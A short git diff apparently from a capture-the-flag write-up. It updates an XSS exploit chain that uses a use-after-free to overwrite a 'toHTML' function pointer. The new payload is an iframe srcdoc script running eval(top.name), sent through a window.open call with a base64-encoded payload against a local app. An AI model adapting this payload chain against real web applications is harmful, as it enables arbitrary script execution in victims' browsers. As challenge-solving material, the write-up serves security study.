@@ -20,7 +20,7 @@ Use After Free (UAF) to overwrite the `toHTML` function pointer to the `populate
 [
   {
     "action": "add",
-    "title": "<img/src/onerror=alert()>",
+    "title": "<iframe srcdoc=\"<script src=/1/;eval(top.name);//></script>\"",
     "content": ""
   },
   {
@@ -35,4 +35,4 @@ Use After Free (UAF) to overwrite the `toHTML` function pointer to the `populate
 ]
 ```
 
-`http://127.0.0.1:5500/?s=WwogIHsKICAgICJhY3Rpb24iOiAiYWRkIiwKICAgICJ0aXRsZSI6ICI8aW1nL3NyYy9vbmVycm9yPSdhbGVydCgpJz4iLAogICAgImNvbnRlbnQiOiAiIgogIH0sCiAgewogICAgImFjdGlvbiI6ICJkZWxldGUiLAogICAgIm5vdGVJZCI6IDAKICB9LAogIHsKICAgICJhY3Rpb24iOiAiYWRkIiwKICAgICJ0aXRsZSI6ICJcdTAwMDVcdTAwMDBcdTAwMDBcdTAwMDAiLAogICAgImNvbnRlbnQiOiAiIgogIH0KXQ`
+`window.open("http://127.0.0.1/?s=WwogIHsKICAgICJhY3Rpb24iOiAiYWRkIiwKICAgICJ0aXRsZSI6ICI8aWZyYW1lIHNyY2RvYz1cIjxzY3JpcHQgc3JjPS8xLztldmFsKHRvcC5uYW1lKTsvLz48L3NjcmlwdD5cIiIsCiAgICAiY29udGVudCI6ICIiCiAgfSwKICB7CiAgICAiYWN0aW9uIjogImRlbGV0ZSIsCiAgICAibm90ZUlkIjogMAogIH0sCiAgewogICAgImFjdGlvbiI6ICJhZGQiLAogICAgInRpdGxlIjogIlx1MDAwNVx1MDAwMFx1MDAwMFx1MDAwMCIsCiAgICAiY29udGVudCI6ICIiCiAgfQpd", "alert()")`
